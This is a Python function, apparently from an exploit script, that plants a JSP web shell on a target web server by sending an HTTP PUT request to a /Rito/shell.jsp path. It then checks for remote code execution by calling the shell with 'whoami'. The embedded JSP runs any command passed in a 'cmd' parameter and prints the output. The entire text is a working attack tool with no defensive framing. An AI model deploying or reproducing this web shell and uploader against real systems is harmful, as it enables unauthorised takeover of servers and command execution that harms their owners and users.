def check_target(target):
    try:
        base_url = f"http://{target}".rstrip('/')
        shell_name = "shell.jsp"
        put_url = f"{base_url}/Rito/{shell_name}"
        
        # Upload the shell
        put_response = requests.put(
            put_url,
            headers={"Content-Type": "application/x-java-jsp-file"},
            data='''<%@page import="java.util.*,java.io.*"%>
            <%
            if (request.getParameter("cmd") != null) {
                Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
                OutputStream os = p.getOutputStream();
                InputStream in = p.getInputStream();
                DataInputStream dis = new DataInputStream(in);
                String disr = dis.readLine();
                while (disr != null) {
                    out.println(disr); 
                    disr = dis.readLine();
                }
            }
            %>''',
            timeout=10
        )

        if put_response.status_code == 204:
            print(f"{COLOR['GREEN']}[+] Shell uploaded to {put_url}{COLOR['RESET']}")
            
            # Verify execution
            test_url = f"{base_url}/Rito/{shell_name}?cmd=whoami"
            test_resp = requests.get(test_url)
            
            if test_resp.status_code == 200:
                print(f"{COLOR['RED']}[!] RCE Successful!{COLOR['RESET']}")
                print(f"Command output: {test_resp.text}")
                return True
            else:
                print(f"{COLOR['YELLOW']}[!] Shell uploaded but not executing (HTTP {test_resp.status_code}){COLOR['RESET']}")
                return False
        else:
            print(f"{COLOR['YELLOW']}[!] Unexpected response: HTTP {put_response.status_code}{COLOR['RESET']}")
            return False

    except Exception as e:
        print(f"{COLOR['RED']}[!] Error: {str(e)}{COLOR['RESET']}")
        return False
